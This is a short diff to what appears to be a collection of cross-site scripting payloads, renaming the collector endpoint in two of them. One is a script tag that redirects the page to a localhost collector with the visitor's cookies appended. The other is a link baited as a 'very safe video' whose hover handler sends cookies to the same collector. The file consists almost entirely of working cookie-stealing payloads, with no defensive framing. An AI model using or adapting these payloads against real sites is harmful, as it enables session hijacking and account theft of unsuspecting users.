@@ -1,7 +1,8 @@
+
 // Full Redirect //
-<script>window.location='http://localhost:8888/cookiemonster.php?cookie='+escape(document.cookie)</script>
+<script>window.location='http://localhost:8888/xss.php?cookie='+escape(document.cookie)</script>
 
 // Attack launched at hover //
-Check out this very safe video:<a href="https://www.youtube.com/" onmouseover="window.location='http://localhost:8888/cookiemonster.php?'+escape(document.cookie)">
+Check out this very safe video:<a href="https://www.youtube.com/" onmouseover="window.location='http://localhost:8888/xss.php?'+escape(document.cookie)">
 https://www.youtube.com/
 </a>
